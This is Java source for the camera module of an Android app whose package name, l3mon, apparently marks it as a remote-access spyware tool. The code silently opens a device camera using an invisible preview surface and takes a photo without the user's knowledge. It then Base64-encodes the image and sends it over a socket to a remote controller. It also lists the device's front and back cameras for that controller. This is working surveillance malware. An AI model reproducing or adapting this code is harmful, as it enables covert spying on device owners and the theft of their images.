package com.etechd.l3mon.features.camera;

import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.util.Base64;
import android.util.Log;

import com.etechd.l3mon.core.network.SocketClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;

public class CameraManager {

    private static final String TAG = "CameraManager";
    private final Context context;
    private Camera camera;

    public CameraManager(Context context) {
        this.context = context;
    }

    public void startUp(int cameraID) {
        try {
            camera = Camera.open(cameraID);
            if (camera == null) {
                Log.e(TAG, "Camera open failed");
                return;
            }

            Camera.Parameters parameters = camera.getParameters();
            camera.setParameters(parameters);

            try {
                camera.setPreviewTexture(new SurfaceTexture(0));
                camera.startPreview();
            } catch (RuntimeException re) {
                Log.e(TAG, "RuntimeException during preview start", re);
            } catch (Exception e) {
                Log.e(TAG, "Preview start error", e);
            }

            final int requestedCameraId = cameraID;
            camera.takePicture(null, null, (data, cam) -> {
                releaseCamera();
                sendPhoto(data, requestedCameraId);
            });

        } catch (Exception e) {
            Log.e(TAG, "Camera startup error", e);
        }
    }

    private void sendPhoto(byte[] data, int cameraId) {
        if (data == null || data.length == 0) return;

        try {
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);

            JSONObject object = new JSONObject();
            object.put("image", true);
            object.put("cameraId", cameraId);
            object.put("timestamp", System.currentTimeMillis());
            object.put("buffer", Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP));

            SocketClient.getInstance().getSocket().emit("0xCA", object);

        } catch (JSONException e) {
            Log.e(TAG, "sendPhoto JSON error", e);
        }
    }

    private void releaseCamera() {
        if (camera != null) {
            try {
                camera.stopPreview();
                camera.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing camera", e);
            }
            camera = null;
        }
    }

    public JSONObject findCameraList() {
        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)) {
            return null;
        }

        try {
            JSONObject cameras = new JSONObject();
            JSONArray list = new JSONArray();
            cameras.put("camList", true);

            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);

                JSONObject camObj = new JSONObject();
                camObj.put("id", i);
                switch (info.facing) {
                    case Camera.CameraInfo.CAMERA_FACING_FRONT:
                        camObj.put("name", "Front");
                        break;
                    case Camera.CameraInfo.CAMERA_FACING_BACK:
                        camObj.put("name", "Back");
                        break;
                    default:
                        camObj.put("name", "Other");
                        break;
                }
                list.put(camObj);
            }

            cameras.put("list", list);
            return cameras;

        } catch (JSONException e) {
            Log.e(TAG, "findCameraList JSON error", e);
        }
        try {
            JSONObject fallback = new JSONObject();
            fallback.put("camList", true);
            fallback.put("list", new JSONArray());
            return fallback;
        } catch (JSONException e) {
            Log.e(TAG, "findCameraList fallback error", e);
            return null;
        }
    }
}
